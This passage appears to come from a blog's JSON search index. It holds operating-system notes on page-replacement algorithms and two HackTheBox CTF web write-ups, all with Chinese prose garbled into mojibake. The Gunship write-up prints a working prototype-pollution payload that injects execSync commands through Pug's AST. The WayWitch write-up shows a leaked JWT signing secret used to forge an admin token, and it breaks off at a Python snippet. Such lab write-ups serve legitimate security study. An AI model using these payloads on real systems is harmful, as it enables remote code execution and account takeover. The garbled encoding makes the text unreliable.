ç‰©ç†åœ°å€ã€‚è¿™æ ·æ•ˆç‡ä¼šé«˜å¾ˆå¤šã€‚ å¦‚æœå†…å­˜å·²ç»æ»¡äº†ï¼Œæˆ‘ä»¬è¯¥æŠŠç°æœ‰çš„å“ªä¸€é¡µç»™æ¢ä¸‹å»ï¼Ÿ è¿™äº›æ­£æ˜¯æˆ‘ä»¬ä¸‹é¢ä¼šä»”ç»†è®²çš„å†…å®¹ã€‚ ç†è®ºä¸Šæœ€å®Œç¾çš„ç®—æ³•å½“ç„¶æ˜¯æ›¿æ¢æ‰é‚£ä¸ª ä¸‹ä¸€æ¬¡å°†è¢«è®¿é—®æ—¶é—´æœ€æ™š çš„é¡µé¢ã€‚æ“ä½œç³»ç»Ÿè‚¯å®šæ˜¯æ— æ³•åšåˆ°é¢„çŸ¥æœªæ¥çš„ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥å°è¯•å¾€è¿™ä¸ªæ–¹å‘é ã€‚ FIFOè·Ÿæ™®é€šçš„First-in-First-Outä¸€æ ·ï¼Œå…ˆæ›¿æ¢æ‰æœ€æ—©æ¥çš„ã€‚ ä¾‹å­ï¼š ç¼ºç‚¹ï¼šåœ¨å®é™…æƒ…å†µé‡Œå¤§éƒ¨åˆ†æœ€æ—©æ¥çš„éƒ½æ˜¯æœ€é‡è¦çš„ï¼Œæ‰€ä»¥ä¹‹åå¤§æ¦‚ç‡ä¼šå¤šæ¬¡è®¿é—®ï¼Œå¦‚æœè¢«æ›¿æ¢ä¸‹å»äº†ä¼šä¸€ç›´è§¦å‘Page Faultï¼Œå¼€é”€ä¼šå¾ˆå¤§ã€‚ æ‰€ä»¥ç›¸æ¯”ä¹‹ä¸‹è¾ƒå¸¸ç”¨çš„æ˜¯å®ƒçš„æ”¹ç‰ˆï¼šSecond-Chance-Algorithmusã€‚ Second-Chance-Algorithmusåœ¨FIFOçš„åŸºç¡€ä¸Šï¼Œä¼šç»™æ¯é¡µç¬¬äºŒæ¬¡æœºä¼šã€‚ é¡µé¢è¢«è®¿é—®æ—¶ä¼šè®¾ç½®R-bit = 1ã€‚å¦‚æœåœ¨é˜Ÿä¼é¦–åˆ™åˆ¤æ–­R-Bitçš„å€¼ï¼Œç­‰äº0å°±ä¼šè¢«æ›¿æ¢æ‰ï¼ˆå¦‚æœM=1éœ€è¦å…ˆæ‰§è¡Œå†™å…¥æ“ä½œç„¶åå†æ›¿æ¢ï¼‰ï¼Œç­‰äº1çš„è¯å°±ç»™R-Bitçš„å€¼æ›´æ–°æˆ0ç„¶åæŒªåˆ°é˜Ÿä¼å°¾ã€‚ å›¾ç¤ºï¼š ç¼ºç‚¹ï¼šæ¯æ¬¡éƒ½ç§»åŠ¨æ•´ä¸ªé˜Ÿåˆ—éå¸¸éº»çƒ¦ã€‚ æ‰€ä»¥ä½¿ç”¨æ›´é«˜æ•ˆçš„æ•°æ®ç»“æ„æ›¿ä»£é˜Ÿåˆ—ï¼šClockã€‚ Clock-Algorithmuså°†æ‰€æœ‰é¡µé¢æŒ‰é¡ºåºç»„æˆä¸€ä¸ªç¯çŠ¶åˆ—è¡¨ï¼ˆå°±åƒClockä¸€æ ·ï¼‰ï¼Œæœ‰ä¸€ä¸ªâ€œæ—¶é’ŸæŒ‡é’ˆâ€æŒ‡å‘å…¶ä¸­æŸä¸ªé¡µé¢ï¼Œè¡¨ç¤ºå½“å‰æ£€æŸ¥çš„ä½ç½®ã€‚è¿™ä¸ªæŒ‡é’ˆç”¨äºå¯»æ‰¾è¦æ›¿æ¢çš„é¡µé¢ã€‚ å…·ä½“æµç¨‹ï¼š å¦‚æœå½“å‰æŒ‡å‘çš„é¡µé¢çš„ R ä½ä¸º 0ï¼š æ›¿æ¢è¿™ä¸ªé¡µé¢ä¸ºæ–°é¡µé¢ æŒ‡é’ˆç§»åŠ¨ä¸€æ ¼ï¼ˆé¡ºæ—¶é’ˆï¼‰ å¦‚æœ R ä½ä¸º 1ï¼š å°† R ä½æ¸…é™¤ï¼ˆè®¾ä¸º 0ï¼‰ æŒ‡é’ˆç»§ç»­ç§»åŠ¨ä¸€æ ¼ï¼Œæ£€æŸ¥ä¸‹ä¸€ä¸ªé¡µé¢ é‡å¤ 1-2 æ­¥éª¤ï¼š ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ª R ä½ä¸º 0 çš„é¡µé¢ è¿™ä¸ªé¡µé¢ä¼šè¢«æ›¿æ¢ å¦‚æœè¯¥é¡µé¢çš„ M ä½ï¼ˆModified Bitï¼‰ä¸º 1ï¼š å°†è¯¥é¡µé¢å†…å®¹å†™å›ç£ç›˜ å¦‚æœ M ä½ä¸º 0ï¼š ç›´æ¥ä¸¢å¼ƒè¯¥é¡µé¢ï¼ˆå› ä¸ºå®ƒæœªè¢«ä¿®æ”¹ï¼‰ å…·ä½“ä¾‹å­è§æ–‡ç« ç»“å°¾çš„ä¾‹é¢˜ã€‚ Clock ä¾‹å­ï¼š å‡è®¾ç°åœ¨éœ€è¦è¿›è¡Œè¿™äº›æ“ä½œï¼š é‚£ä¹ˆï¼šï¼ˆæ¯ä¸€æ­¥é‡Œè¢«ä¿®æ”¹äº†çš„å†…å®¹éƒ½ç”¨æ©™è‰²æ ‡å‡ºæ¥äº†çš„ï¼‰ Least Recently Used (LRU)å› ä¸ºç¨‹åºçš„å±€éƒ¨æ€§åŸç†ï¼ˆLokalitÃ¤tseigenschaftï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å‡è®¾è¿‡å»ç»å¸¸ä½¿ç”¨çš„é¡µé¢ï¼Œæœªæ¥ä¹Ÿå¯èƒ½è¢«å†æ¬¡ä½¿ç”¨ã€‚ å½“å‘ç”ŸPage Faultæ—¶ï¼Œæ›¿æ¢æ‰é‚£ä¸ªâ€œæœ€é•¿æ—¶é—´æ²¡è¢«ä½¿ç”¨â€çš„é¡µé¢ã€‚ ç¼ºç‚¹ï¼šè¿™ä¸ªæ–¹æ³•çš„å®ç°éœ€è¦ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œè®°å½•æ‰€æœ‰è¢«è®¿é—®é¡µé¢ï¼Œæ¯æ¬¡è®¿é—®é¡µé¢éƒ½è¦æŠŠå®ƒç§»åˆ°è¡¨å¤´ï¼ˆæ„å‘³ç€é¢‘ç¹æ›´æ–°ï¼‰ï¼Œå¼€é”€å¤ªå¤§äº†ï¼Œæ•ˆç‡ä¸é«˜ã€‚ ä¸è¿‡æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨è½¯ä»¶è¿‘ä¼¼æ¨¡æ‹ŸLRUï¼ˆç”¨â€œè¿‘ä¼¼ä½†æ•ˆç‡æ›´é«˜â€çš„æ–¹æ³•æ¥æ¨¡æ‹Ÿ LRU çš„è¡Œä¸ºè¶‹åŠ¿ï¼‰ï¼šNot Frequently Used (NFU) å’Œ Agingã€‚ LRUä¾‹å­ï¼š å‡è®¾ç°åœ¨æœ‰6é¡µï¼ˆPageï¼‰å’Œ4ä¸ªé¡µæ¡†ï¼ˆKachelnï¼‰ï¼Œæˆ‘ä»¬æƒ³è¦æŒ‰ç…§è¿™ä¸ªé¡ºåºè®¿é—®ï¼š1 3 5 4 2 4 3 2 1 0 5 3 ï¼Œé‚£ä¹ˆå…·ä½“çš„è¿‡ç¨‹ä¾¿æ˜¯ï¼š Not Frequently Used (NFU) ç»™æ¯ä¸ªé¡µé¢ P å¼•å…¥ä¸€ä¸ªè½¯ä»¶è®¡æ•°å™¨ $A_p$ å›ºå®šå¤§å°ï¼Œä¾‹å¦‚ b ä½ï¼ˆbitï¼‰ï¼Œåˆå§‹ä¸º 0 æ¯æ¬¡å®šæ—¶å™¨ä¸­æ–­ï¼ˆTimer-Interruptï¼‰æ—¶ï¼š æ“ä½œç³»ç»Ÿæ£€æŸ¥æ‰€æœ‰é¡µé¢çš„ R ä½ï¼ˆè¢«è®¿é—®ä½ï¼‰ å¦‚æœæŸä¸ªé¡µé¢ P çš„ R ä½è¢«è®¾ç½®ï¼š å¯¹åº”çš„è®¡æ•°å™¨ $A_p$ åŠ  1 ç¼ºç‚¹ï¼šNFUå¹¶ä¸çŸ¥é“â€œè®¿é—®æ˜¯å¦æ˜¯æœ€è¿‘çš„â€ï¼ŒåªçŸ¥é“æ€»è®¿é—®æ¬¡æ•°ã€‚æ¯”å¦‚è¯´ä¸€ä¸ªé¡µé¢è¿‡å»è®¿é—®å¾ˆå¤šï¼Œä½†æœ€è¿‘ä¸€ç›´æ²¡è¢«è®¿é—®ï¼ŒNFUä»ç„¶ä¼šè®¤ä¸ºå®ƒå¾ˆé‡è¦ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ä¾¿éœ€è¦Aging-Verfahrenã€‚ NFU ä¾‹å­1ï¼š é¡µé¢ç¼–å·ï¼š0, 1, 2, 3, 4 è®¿é—®é¡ºåºï¼ˆå‚è€ƒé“¾ï¼‰ï¼š0111221123324434 å¾—åˆ°çš„è®¡æ•°å™¨å€¼ï¼š$A_0=1, A_1=5, A_2=4, A_3=3, A_4=3,$ NFU ä¾‹å­2ï¼š å‡è®¾ç°åœ¨æœ‰6é¡µï¼ˆPageï¼‰å’Œ4ä¸ªé¡µæ¡†ï¼ˆKachelnï¼‰ï¼Œæˆ‘ä»¬æƒ³è¦æŒ‰ç…§è¿™ä¸ªé¡ºåºè®¿é—®ï¼š1 3 5 4 2 4 3 2 1 0 5 3 ï¼Œé‚£ä¹ˆå…·ä½“çš„è¿‡ç¨‹ä¾¿æ˜¯ï¼š Aging-VerfahrenAgingä¸»è¦çš„æ€è·¯æ˜¯è®°å½•è®¿é—®çš„â€œè€åŒ–â€ç¨‹åº¦ï¼ˆErfassung der Alterung von Zugriffenï¼‰ã€‚ é¦–å…ˆè®¾ç½®ä¸€ä¸ªå›ºå®šæ—¶é—´é—´éš” tï¼ˆæ¯”å¦‚ 20 æ¯«ç§’ï¼‰å¹¶è®°å½•å“ªäº›é¡µé¢åœ¨è¿™ä¸ªé—´éš”å†…è¢«è®¿é—®äº†ã€‚ åŒæ ·ä¼šç»™æ¯ä¸ªé¡µé¢ P å¼•å…¥ä¸€ä¸ªè½¯ä»¶è®¡æ•°å™¨ $A_p$ã€‚ æ¯éš” t çš„æ—¶é—´éƒ½ä¼šæ›´æ–°$A_p$ï¼š å°†è®¡æ•°å™¨å‘å³ç§»ä¸€ä½ï¼ˆshiftï¼‰ æŠŠå½“å‰ R ä½çš„å€¼æ”¾åˆ°æœ€é«˜ä½ Aging ä¾‹å­ï¼š å‡è®¾ï¼šAging è®¡æ•°å™¨ä¸º 4 ä½ï¼ˆäºŒè¿›åˆ¶ï¼‰ï¼Œå½“å‰è®¡æ•°å™¨ $A_p = 1100_2 = 12_{10}$ï¼Œå½“å‰çš„å¼•ç”¨ä½ R = 0ã€‚ é‚£ä¹ˆæ–°çš„ $A_p$ ä¼šå˜æˆ $0110_2 = 6_{10}$ ã€‚ å½“ç„¶ï¼ŒAgingä¹Ÿæ˜¯æœ‰ä¸€å®šå±€é™æ€§çš„ï¼Œä½†æ˜¯æˆ‘æ²¡çœ‹æ‡‚ã€‚ï¼ˆä¹ï¼‰ Working-Set Ersetzungs-Verfahrenå‰é¢è¿™äº›ç­–ç•¥å…¨éƒ½æ˜¯åŸºäºæŒ‰éœ€åˆ†é¡µï¼ˆDemand Pagingï¼‰çš„ï¼Œæˆ‘ä»¬ç°åœ¨æ¥çœ‹ç‚¹ä¸ä¸€æ ·çš„ã€‚ é¦–å…ˆï¼Œä¸€ä¸ªè¿›ç¨‹å½“å‰çœŸæ­£éœ€è¦çš„é‚£ä¸€æ‰¹é¡µé¢ï¼ˆDie Menge der Seiten, die ein Prozess aktuell benÃ¶tigtï¼‰ç§°ä¸ºï¼šå·¥ä½œé›†ï¼ˆWorking Setï¼‰ã€‚è€ŒæŠ–åŠ¨ï¼ˆSetitenflatternï¼ŒThrashingï¼‰æŒ‡çš„æ˜¯å½“è¿›ç¨‹é¢‘ç¹åœ°è§¦å‘Page Faultã€‚ åœ¨Working-Set-Modellä¸­ï¼š åœ¨ä»»æ„æ—¶åˆ» tï¼Œå·¥ä½œé›† w(k, t) è¡¨ç¤ºè¿›ç¨‹åœ¨æœ€è¿‘çš„ k æ¬¡å†…å­˜è®¿é—®ä¸­è®¿é—®åˆ°çš„é¡µé¢é›†åˆã€‚ï¼ˆä»tå¾€å‰æ•°kä¸ªï¼‰ æ¯”å¦‚è¯´ç»™å®šä¸€ä¸ªè®¿é—®åºåˆ—ï¼š26157777516234123444344ï¼Œå¹¶ä¸”å°†kè®¾ç½®ä¸º4ï¼Œé‚£ä¹ˆw(k, t1) = {3, 4}ï¼Œw(8, t1) = {2, 3, 4}ã€‚ æœ€ç®€å•çš„åŠæ³•è‚¯å®šæ˜¯åªæ›¿æ¢ä¸åœ¨å½“å‰å·¥ä½œé›†å†…çš„é¡µé¢ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½å¾€å‰è¿½è¸ªkæ¬¡è®¿é—®å¸¦æ¥çš„å¼€é”€å¤ªå¤§äº†ã€‚æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨è¿›ç¨‹çš„æ‰§è¡Œæ—¶é—´ï¼ˆRechenzeitï¼‰æ¥è¿‘ä¼¼ã€‚ éœ€è¦å…ˆå®šä¹‰å‡ ä¸ªå€¼ï¼š æ‰§è¡Œæ—¶é—´åŒºé—´ $\\tau$ æ—¶é—´é—´éš” Iï¼ˆClock Tick é—´éš”ï¼‰ ç»™æ¯ä¸ªè¿›ç¨‹è®¾ç½®ä¸€ä¸ªå•è°ƒé€’å¢çš„è®¡æ•°å™¨ $Z$ï¼Œç”¨äºè¿‘ä¼¼è¿›ç¨‹çš„æ‰§è¡Œæ—¶é—´ï¼ˆAusfÃ¼hrungszeit /Rechenzeit)ï¼Œå®é™…ä½¿ç”¨CPUçš„æ—¶é—´ï¼‰ ç»™æ¯ä¸€é¡µ P è®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨ $Z_p$ï¼Œç”¨äºè¿‘ä¼¼ä¸Šæ¬¡è®¿é—®çš„æ—¶é—´ã€‚ Working-Set Ersetzungs-Verfahrenï¼š å½“å‘ç”Ÿé¡µé¢é”™è¯¯æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæ£€æŸ¥æ‰€æœ‰é¡µçš„ R ä½ï¼ˆR-Bitsï¼‰ï¼š å¦‚æœR=1 fÃ¼r Seite Pï¼šé¡µé¢å±äº Working-Setï¼Œä¸ä¼šè¢«æ›¿æ¢ï¼Œä½†æ˜¯ä¼šå°†å½“å‰çš„ $Z_p$ æ›´æ–°æˆ $Z$ çš„å€¼ï¼› å¦‚æœR=0 fÃ¼r Seite Pï¼š å¦‚æœ$Z - Z_P &gt; \\tau$ï¼šPä¸å±äºWorking-Setï¼Œä¼šè¢«æ›¿æ¢æ‰ï¼› å¦‚æœ$Z - Z_P \\leq \\tau$ï¼šè™½ç„¶ P åœ¨ I è¿™æ®µæ—¶é—´é‡Œæ²¡æœ‰è¢«ä½¿ç”¨è¿‡ï¼Œä½†è¿˜æ˜¯å±äº Working-Setã€‚ å¦‚æœæ‰¾åˆ°äº†å¤šä¸ªç¬¦åˆæ¡ä»¶çš„å€™é€‰é¡µï¼šç³»ç»Ÿä¼šé€‰æ‹© $Z_p$ æœ€å°çš„é‚£ä¸€é¡µï¼Œç§°ä¸º $P_{\\text{old}}$ã€‚ å¦‚æœæ‰¾ä¸åˆ°ä»»ä½•é¡µé¢å¯ä»¥æ¢å‡ºï¼ˆæ‰€æœ‰é¡µé¢éƒ½è¿˜åœ¨ Working Set ä¸­ï¼‰ï¼šæ›¿æ¢æœ€è€çš„é¡µé¢ï¼ˆå³ $P_{\\text{old}}$ï¼‰ã€‚ ç¼ºç‚¹ï¼šå®ç°èµ·æ¥éå¸¸å¤æ‚ã€‚ æ‰€ä»¥å®é™…ä¸­ä¼šç”¨ Working-Set Ansatz mit Clock-artiger Verwaltung der Seitenã€‚ Working Set with Clockmalloc()Linuxä¸­çš„å†…å­˜ç®¡ç†ä½¿ç”¨4çº§é¡µè¡¨ï¼ˆ4-stufige Pagetabelleï¼‰ã€‚ å†…å­˜åˆ†é…ï¼ˆSpeicher-Allokationï¼‰ï¼š Buddy åˆ†é…å™¨ï¼ˆBuddy-Allocatorï¼ŒåŸºäºä¹‹å‰è®²çš„Buddy-Algorithmï¼‰ï¼šæœ€å°åˆ†é…å•ä½ä¸ºé¡µï¼ˆpageï¼‰ é¡µé¢æ›¿æ¢ç­–ç•¥ï¼ˆSeitenersetzungsstrategieï¼‰ï¼š ä½¿ç”¨ Swap åŒºï¼šé¡µä¸ä¼šç«‹å³è¢«æ¢å‡ºï¼Œè€Œæ˜¯æš‚å­˜åœ¨ Swap åŒº æ“ä½œç³»ç»Ÿä¼šä¿ç•™ä¸€éƒ¨åˆ†ç©ºé—²å¸§ï¼ˆFramesï¼‰ï¼Œä»¥ä¾¿å¿«é€ŸåŠ è½½éœ€è¦çš„é¡µé¢ ä½¿ç”¨ Clock æ›¿æ¢ç®—æ³•çš„ä¸€ä¸ªå˜ç§ ä½œä¸ºé¡µé¢æ›¿æ¢ç­–ç•¥ ä¾‹é¢˜","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"å†…å­˜ç®¡ç†","slug":"å†…å­˜ç®¡ç†","permalink":"https://archer-baiyi.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/tags/Ersetztungsstrategie/"}]},{"title":"HTB Gunship Writeup","slug":"CTF/Web/HTB-Gunship-Writeup","date":"2025-04-02T18:13:43.000Z","updated":"2025-04-02T21:31:57.706Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Gunship-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-Gunship-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š æŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425const path = require(&#x27;path&#x27;);const express = require(&#x27;express&#x27;);const pug = require(&#x27;pug&#x27;);const &#123; unflatten &#125; = require(&#x27;flat&#x27;);const router = express.Router();router.get(&#x27;/&#x27;, (req, res) =&gt; &#123; return res.sendFile(path.resolve(&#x27;views/index.html&#x27;));&#125;);router.post(&#x27;/api/submit&#x27;, (req, res) =&gt; &#123; const &#123; artist &#125; = unflatten(req.body); if (artist.name.includes(&#x27;Haigh&#x27;) || artist.name.includes(&#x27;Westaway&#x27;) || artist.name.includes(&#x27;Gingell&#x27;)) &#123; return res.json(&#123; &#x27;response&#x27;: pug.compile(&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;)(&#123; user: &#x27;guest&#x27; &#125;) &#125;); &#125; else &#123; return res.json(&#123; &#x27;response&#x27;: &#x27;Please provide us with the full name of an existing member.&#x27; &#125;); &#125;&#125;);module.exports = router; å‘ç°å®ƒä½¿ç”¨äº† pug æ¨¡æ¿å¼•æ“ï¼Œæ˜¯ä¸“é—¨ç”¨æ¥ç”Ÿæˆ HTMLçš„ã€‚ ä½¿ç”¨BurpsuitæŠ“åŒ…å¯ä»¥å‘ç°ç½‘é¡µç»™ /api/submit å‘é€çš„æ˜¯ï¼š æ¸—é€è¿™æ®µä»£ç é‡Œä¸€å¼€å§‹å¼•ç”¨çš„ unflatten() æ­£æ˜¯æ¼æ´æ‰€åœ¨ã€‚ ï¼ˆå…·ä½“æ”»å‡»åŸç†å‚è€ƒ https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68ï¼‰ å°†å‘é€çš„å†…å®¹æ”¹æˆï¼ˆæ”¾åˆ°Repeateré‡Œä¿®æ”¹äº†å†å‘é€ï¼‰ï¼š 123456789&#123; &quot;artist.name&quot;: &quot;Haigh&quot;, &quot;__proto__&quot;: &#123; &quot;block&quot;: &#123; &quot;type&quot;: &quot;Text&quot;, &quot;line&quot;: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; è¿™ä¸ªå†…å®¹ç»è¿‡ unflatten() çš„å¤„ç†åä¼šå˜æˆï¼š 123456789&#123; artist: &#123; name: &quot;Haigh&quot; &#125;, __proto__: &#123; block: &#123; type: &quot;Text&quot;, line: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; è¿™é‡Œçš„__proto__ ä¼šæ±¡æŸ“ æ‰€æœ‰å¯¹è±¡çš„åŸå‹ï¼Œè®©æ‰€æœ‰å¯¹è±¡éƒ½æ‹¥æœ‰ .block è¿™ä¸ªå±æ€§ã€‚ è¿™æ®µä»£ç æœ€ç»ˆå¹²çš„äº‹æƒ…ä¾¿æ˜¯ï¼š 1cp /app/flag* /app/static/flag ä¼šå°†flagçš„å†…å®¹å¤åˆ¶åˆ° /app/static/flag ç›®å½•ä¸‹ï¼Œç„¶åæˆ‘ä»¬ç›´æ¥è®¿é—® 1http://83.136.249.227:44133/static/flag ä¾¿å¯ä¸‹è½½æ–‡ä»¶ç„¶åå¾—åˆ°flagï¼šHTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/tags/RCE/"}]},{"title":"HTB WayWitch Writeup","slug":"CTF/Web/HTB-WayWitch-Writeup","date":"2025-04-02T16:03:54.000Z","updated":"2025-04-02T21:32:28.368Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š è¾“å…¥123è¯•è¯•ï¼Œç„¶åæŸ¥çœ‹cookieï¼š å› ä¸ºcookieçš„å†…å®¹ä¸º3éƒ¨åˆ†ï¼Œæ¯2éƒ¨åˆ†ç”± . éš”å¼€çš„ï¼Œæ‰€ä»¥æ˜¯JWTï¼Œç”¨ https://jwt.io/ è¯•è¯•ï¼š å»ç»™çš„é™„ä»¶é‡Œæ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰å…³äºJWTçš„ä¿¡æ¯ã€‚ è¿æ°”æ¯”è¾ƒå¥½ï¼Œé€šè¿‡ç›´æ¥æœç´¢ â€œJWTâ€ å¯ä»¥åœ¨ scr/views/index.html é‡Œæ‰¾åˆ°è¿™éƒ¨åˆ†å†…å®¹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061async function generateJWT() &#123; const existingToken = getCookie(&quot;session_token&quot;); if (existingToken) &#123; console.log(&quot;Session token already exists:&quot;, existingToken); return; &#125; const randomNumber = Math.floor(Math.random() * 10000); const guestUsername = &quot;guest_&quot; + randomNumber; const header = &#123; alg: &quot;HS256&quot;, typ: &quot;JWT&quot;, &#125;; const payload = &#123; username: guestUsername, iat: Math.floor(Date.now() / 1000), &#125;; const secretKey = await crypto.subtle.importKey( &quot;raw&quot;, new TextEncoder().encode(&quot;halloween-secret&quot;), &#123; name: &quot;HMAC&quot;, hash: &quot;SHA-256&quot; &#125;, false, [&quot;sign&quot;], ); const headerBase64 = btoa(JSON.stringify(header)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const payloadBase64 = btoa(JSON.stringify(payload)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const dataToSign = `$&#123;headerBase64&#125;.$&#123;payloadBase64&#125;`; const signatureArrayBuffer = await crypto.subtle.sign( &#123; name: &quot;HMAC&quot; &#125;, secretKey, new TextEncoder().encode(dataToSign), ); const signatureBase64 = btoa( String.fromCharCode.apply( null, new Uint8Array(signatureArrayBuffer), ), ) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const token = `$&#123;dataToSign&#125;.$&#123;signatureBase64&#125;`; document.cookie = `session_token=$&#123;token&#125;; path=/; max-age=$&#123;60 * 60 * 24&#125;; Secure`; console.log(&quot;Generated JWT Session Token:&quot;, token); &#125; å¯ä»¥å‘ç°è¿™é‡Œæ˜¯æŠŠ halloween-secret ä½œä¸ºå¯†é’¥è¿›è¡Œç­¾åçš„ã€‚ç»§ç»­é˜…è¯»æºç ï¼Œå¯ä»¥åœ¨ scr/routes/index.js é‡Œå‘ç°ï¼š 12345678910111213141516171819202122232425262728router.get(&quot;/tickets&quot;, async (req, res) =&gt; &#123; const sessionToken = req.cookies.session_token; if (!sessionToken) &#123; return res.status(401).json(response(&quot;No session token provided&quot;)); &#125; try &#123; const username = getUsernameFromToken(sessionToken); if (username === &quot;admin&quot;) &#123; try &#123; const tickets = await db.get_tickets(); return res.status(200).json(&#123; tickets &#125;); &#125; catch (err) &#123; return res .status(500) .json(response(&quot;Error fetching tickets: &quot; + err.message)); &#125; &#125; else &#123; return res .status(403) .json(response(&quot;Access denied. Admin privileges required.&quot;)); &#125; &#125; catch (err) &#123; return res.status(400).json(response(err.message)); &#125;&#125;); ä¹Ÿå°±æ˜¯è¯´ /tickets é¡µé¢åªä¼šéªŒè¯æˆ‘ä»¬çš„usernameæ˜¯å¦ç­‰äºadminã€‚ å¹¶ä¸”flagå°±åœ¨è¿™ä¸ªé¡µé¢é‡Œï¼Œå› ä¸ºå¯¹åº”çš„databaseçš„å†…å®¹ä¸ºï¼š 1234567891011121314151617181920212223242526async migrate() &#123; let flag; fs.readFile(&quot;/flag.txt&quot;, &quot;utf8&quot;, function (err, data) &#123; flag = data; &#125;); await this.db.exec(` DROP TABLE IF EXISTS tickets; CREATE TABLE tickets( id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(255) NOT NULL, username VARCHAR(255) NOT NULL, content TEXT NOT NULL ); `); await this.db.exec(` INSERT INTO tickets (name, username, content) VALUES (&#x27;John Doe&#x27;, &#x27;guest_1234&#x27;, &#x27;I need help with my account.&#x27;), (&#x27;Jane Smith&#x27;, &#x27;guest_5678&#x27;, &#x27;There is an issue with my subscription.&#x27;), (&#x27;Admin&#x27;, &#x27;admin&#x27;, &#x27;Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter $&#123;flag&#125;&#x27;), (&#x27;Paul Blake&#x27;, &#x27;guest_9012&#x27;, &#x27;Can someone assist with resetting my password?&#x27;), (&#x27;Alice Cooper&#x27;, &#x27;guest_3456&#x27;, &#x27;The app crashes every time I try to upload a picture.&#x27;); `); &#125; æ¸—é€é¦–å…ˆç¡®è®¤ä¸€ä¸‹è¿™ä¸ªå¯†é’¥æ˜¯å¦æ­£ç¡®ï¼š ç„¶åå°†usernameçš„å€¼æ”¹ä¸ºâ€adminâ€ï¼Œå†åˆ©ç”¨è¿™ä¸ªæ–°çš„JWTè®¿é—® /tickets ã€‚ è¿™ä¸ªç½‘ç«™ä¸çŸ¥é“ä¸ºä»€ä¹ˆçªç„¶ä¸èƒ½ä¿®æ”¹jwtäº†ï¼Œæ‰€ä»¥å†™æ®µpythonæ‰‹åŠ¨ä¿®æ”¹ï¼š 1234567891011121314import jwtoriginal_token = 